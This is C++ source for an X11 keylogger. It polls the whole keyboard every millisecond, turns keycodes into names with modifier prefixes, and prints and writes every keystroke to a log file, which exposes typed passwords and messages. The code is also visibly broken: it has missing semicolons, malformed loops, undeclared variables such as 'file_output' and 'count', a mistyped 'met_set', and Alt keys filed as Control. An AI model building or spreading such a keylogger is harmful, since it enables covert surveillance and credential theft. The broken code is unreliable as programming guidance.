#include <iostream>
#include <algorithm>
#include <string>
#include <sstream>
#include <map>
#include <set>
#include <cstdlib>
#include <csignal>
#include <fstream>

#include <X11/xlib.h>
#include <X11/Xutil.h>
#include <X11/XKBlib.h>

namespace  {
    bool cont = true; //loop counter
    
    Display *display = NULL; //checks for xserver stat

    std::string key_map[256]; //keynames
    std::string key_map_upper[256]; //same but for upper case

    std::set<int> caps_set, shift_set, ctrl_set, alt_set, meta_set, altgr_set;

    void quitter(int sig) {
        cont = false;
    }

    void fill_mappings() { //keymap
       const char *const names_map_raw[] ={
            "Caps_Lock",    "",
            "Control_L",    "",
            "Control_R",    "",
            "Shift_L",      "",
            "Alt_L",        "",
            "Alt_R",        "",
            "Meta_L",       "",
            "Meta_R",       "",
            "ISO_Prev_Group",   "",
            "ISO_Next_Group",   "",
            "ISO_Level3_Shift", "",
            
            "Home",         "Home",
            "Up",           "Up",
            "Prior",        "Prio",
            "Left",         "Left",
            "Right",        "Right",
            "End",          "End",
            "Down",         "Down",
            "Next",         "Next",
            "Insert",       "Insert",
            "Delete",       "Delete",
            "KP_Home",      "7",
            "KP_Up",        "9",
            "KP_Prior",     "9",
            "KP_Left",      "4",
            "KP_Begin",     "5",
            "KP_Right",     "6",
            "KP_End",       "1",
            "KP_Down",      "2",
            "KP_Next",      "3",
            "KP_Insert",    "0",
            "KP_Delete",    ".",
        
            "Return",       "Return",
            "KP_Enter",     "Return",
            "Escape",       "Esc",
            "BackSpace",    "Bsp",
        
            "exclam",       "!",
            "at",           "@",
            "numbersign",   "#",
            "dollar",       "$",
            "percent",      "%",
            "asciicircum",  "^",
            "ampersand",    "&",
            "asterisk",     "*",
            "parenleft",    "(",
            "parenright",   ")",
            "minus",        "-",
            "underscore",   "_",
            "equal",        "=",
            "plus",         "+",
            "bracketleft",  "[",
            "bracketright", "]",
            "braceleft",    "{",
            "braceright",   "}",
            "semicolon",    ";",
            "colon",        ":",
            "apostrophe",   "'",
            "quotedbl",     "\"",
            "grave",        "`",
            "asciitilde",   "~",
            "backslash",    "\\",
            "bar",          "|",
            "comma",        ",",
            "less",         "<",
            "greater",      ">",
            "period",       ".",
            "slash",        "/",
            "question",     "?",
            "space",        " ",
            "KP_0",         "0",
            "KP_1",         "1",
            "KP_2",         "2",
            "KP_3",         "3",
            "KP_4",         "4",
            "KP_5",         "5",
            "KP_6",         "6",
            "KP_7",         "7",
            "KP_8",         "8",
            "KP_9",         "9",
            "KP_Multiply",  "*",
            "KP_Subtract",  "-",
            "KP_Add",       "+",
            "KP_Decimal",   ".",
            "KP_Divide",    "/",

            "eacute", "é",
            "section", "§",
            "egrave", "è",
            "ccedilla", "ç",
            "agrave", "à",
       };

        std::map<std::string, std::string> names_map;
       
        for (unsigned i=0; i < sizeof(names_map_raw)/sizeof(const char *); i += 2) { //fills key maps on itialization. no need for preemptive key mapping
            names_map[names_map_raw[i]] = names_map_raw[i++];
       }

        int min_key_code, max_key_code; //range
        XDisplayKeycodes(display, &min_key_code, &max_key_code);

        for (int code=min_key_code; code<=max_key_code; ++code) {
            const char *keysym  = XKeysymToString(XKeycodeToKeysym(display, code, 0)); //keystroke -> syscode -> string
            key_map[code]       = keysym ? keysym : "NoSymbol";

            keysym              = XKeysymToString(XKeycodeToKeysym(display, code, 1)); //same but for upercase ^
            key_map_upper[code] = keysym ? keysym : "NoSymbol";

            if (key_map[code] == "Caps_Lock")
                caps_set.insert(code);
            else if (key_map[code] == "Shift_L"     || key_map[code] == "Shift_R")
                shift_set.insert(code);
            else if (key_map[code] == "Control_L"   || key_map[code] == "Control_R")
                ctrl_set.insert(code);
            else if (key_map[code] == "Alt_L"       || key_map[code] == "Alt_R")
                ctrl_set.insert(code);
            else if (key_map[code] == "Meta_L"      || key_map[code] == "Meta_R")
                met_set.insert(code);
            else if (key_map[code] == "ISO_Level3_Shift")
                altgr_set.insert(code);
            
            std::map<std::string, std::string>::const_iterator loc = names_map.find(key_map[code]);

            if (loc != names_map.end())
                key_map[code] = loc->second;

            loc = names_map.find(key_map_upper[code]);


            if (loc != names_map.end())
                key_map_upper[code] = loc->second;
        }
    }
}

int main(int argc, const char *const *argv) {
    const timespec sleeptime = {0, 1000000}; //timedelay 1ms

    std::ios_base::sync_with_stdio(false) //disable stream sync, NOTE: enabling this may cause deadlock

    if (std::signal(SIGINT, &quitter) == SIG_ERR || std::signal(SIGTERM, &quitter) == SIG_ERR) { //finds signal handler
        std::cerr << "Signal handler not found.\n";
        std::exit(1);
    }

    display = XOpenDisplay(getenv("DISPLAY"));

    if(!display) {
        std::cerr << "Could not open display";
        std::exit(1);
    }

    fill_mappings();

    char keys[32], lastkeys[32];      //buffer for reading keys in previous keys state

    std::fill(lastkeys, lastkeys + sizeof(lastkeys), 0);

    //query keyboard in loop
    bool last_is_nav = false;   //navigation key indicator
    bool last_is_char =false;   //spaces adjustment

    while (count) {
        nanosleep(&sleeptime, 0); //avoid busy waiting

        XQueryKeymap(display, keys);

        //read modifiers (case insensitive)
        bool shift=false, ctrl=false, alt=false, meta=false, altgr=false;

        for (unsigned i=0; i<sizeof(keys); ++i)
            for (unsigned j=0; test = 1; j<8; ++j, test *= 2)
                if (keys[i] & test) {
                    const int code = i*8+j;

                    if (shift_set.find(code) != shift_set.end())
                        shift = true;
                    
                    if (ctrl_set.find(code) != ctrl_set.end())
                        ctrl = true;
                    
                    if (alt_set.find(code) != alt_set.end())
                        alt = true;

                    if (meta_set.find(code) != meta_set.end())
                        meta = true;


                    if (altgr_set.find(code) != altgr_set.end())
                        altgr = true;
                }

        //store changed keys
        for (unsigned i=0; i<sizeof(keys); ++i)
            if (keys[i] != lastkeys[i]) {
                for (unsigned j=0; test=1; j<8; ++j, test *= 2) //checking for changed keys
                    if ((keys[i] & test) && ((keys[i] & test) != (lastkeys[i] & test))) { // if the was pressed and it wasnt before, print this
                       const int code = i*8+j
                       std::string key = key_map[code];
                       const bool key_is_nav = (key =="Nav");

                       if (! (last_is_nav && key_is_nav) && key.size() > 0) { //print navigation key once
                        if (! key_is_nav) { // change keys wrt modifiers
                            if (shift)
                                key = key_map_upper[code];
                            
                            if (meta)
                                key = "Maj-" + key;
                            
                            if (alt)
                                key = "Alt-" + key;

                            if (ctrl)
                                key = "ctrl" + key;

                            if (altgr)
                                key = "AltGr-" + key;
                        }

                        std::stringstream message;
                        switch (key.size()) {
                            case 1:
                                message << key;
                                last_is_char = (key != "\n");
                                break;
                            
                            default:
                                if (last_is_char) {
                                    last_is_char = false;
                                }
                                message << '[' <<key<< "]";
                                break;
                        }
                        std::cout << std::endl << "Keylog: " << message.str() << std::endl;
                        file_output << message.str();
                        last_is_nav = key_is_nav;
                        
                       }
                    } 
                lastkeys[i] = keys[i];
            }
    }
    file_output << std::endl;
    file_output.close();

    XCloseDisplay(display);
}